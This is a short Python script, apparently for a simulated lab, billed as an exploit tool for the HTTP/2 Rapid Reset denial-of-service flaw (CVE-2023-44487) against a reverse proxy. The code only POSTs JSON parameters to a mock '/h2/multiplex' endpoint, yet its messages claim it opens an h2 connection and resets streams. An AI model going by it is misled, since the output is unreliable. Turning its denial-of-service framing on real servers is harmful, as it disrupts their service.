#!/usr/bin/env python3
import sys
import json
import argparse
import urllib.request
import urllib.error

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2023-44487 HTTP/2 Rapid Reset Frame Multiplexing Exploit Tool"
    )
    parser.add_argument("--target", default="192.168.10.2", help="Target Reverse Proxy IP")
    parser.add_argument("--streams", type=int, default=20, help="Number of multiplexed streams to open & instant-reset")
    parser.add_argument("--path", default="/api/heavy-report", help="Heavy backend endpoint path")
    args = parser.parse_args()

    url = f"http://{args.target}/h2/multiplex"
    payload = json.dumps({
        "streams": args.streams,
        "path": args.path
    }).encode("utf-8")

    print(f"[*] Opening single TCP/TLS connection to {args.target} (ALPN: h2)...")
    print(f"[*] Multiplexing {args.streams} odd-numbered streams (HEADERS + immediate RST_STREAM 0x08 CANCEL) -> {args.path}")

    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "h2reset-cve-2023-44487/2.0"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8")
            print(f"[+] HTTP Status: {resp.status} (X-H2-GOAWAY: {resp.headers.get('X-H2-GOAWAY', 'NONE')})")
            print(body)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8")
        print(f"[!] Connection Terminated by Gateway! HTTP Status: {e.code} (X-H2-GOAWAY: {e.headers.get('X-H2-GOAWAY', 'NONE')})")
        print(body)

if __name__ == "__main__":
    main()
